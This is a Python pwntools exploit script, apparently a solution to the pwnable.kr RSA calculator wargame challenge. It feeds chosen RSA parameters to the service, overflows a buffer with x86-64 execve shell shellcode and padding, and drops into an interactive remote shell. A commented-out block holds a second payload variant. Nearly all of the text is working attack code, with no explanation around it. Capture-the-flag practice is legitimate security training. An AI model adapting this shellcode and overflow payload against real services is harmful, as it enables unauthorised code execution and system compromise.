from pwn import *

# Ref: https://ko.wikipedia.org/wiki/RSA_%EC%95%94%ED%98%B8

# N = 6313148 = p * q
p = 5141
q = 1228
e = 100
d = 6306781     # d > (p-1) * (q-1)
M = "\x16"
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

conn = remote('pwnable.kr', 9012)

conn.sendlineafter('> ', '1')
for val in [p, q, e, d]:
        conn.sendlineafter(': ', str(val))
print conn.recvuntil('-')
conn.sendlineafter('> ', '2')
conn.sendlineafter(': ', '1024')
conn.sendlineafter('data\n', shellcode + 'A'*(264-len(shellcode)) + M)
conn.sendlineafter('> ', '1')
conn.interactive()

''' for another N
SHELLCODE = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
#Found: m=26, e=6, N=6304474
p = 563
q = 11198
e = 6
d = (p-1)*(q-1)+1
m = chr(26)
payload = SHELLCODE + m*(265-len(SHELLCODE))

r = remote('pwnable.kr', 9012)

r.sendlineafter('> ', '1')
r.sendlineafter('p : ', str(p))
r.sendlineafter('q : ', str(q))
r.sendlineafter('e : ', str(e))
r.sendlineafter('d : ', str(d))
r.sendlineafter('> ', '2')
r.sendlineafter('(max=1024) :', '1024')
r.sendlineafter('data', payload)
r.sendlineafter('> ', '1')
r.interactive()
'''
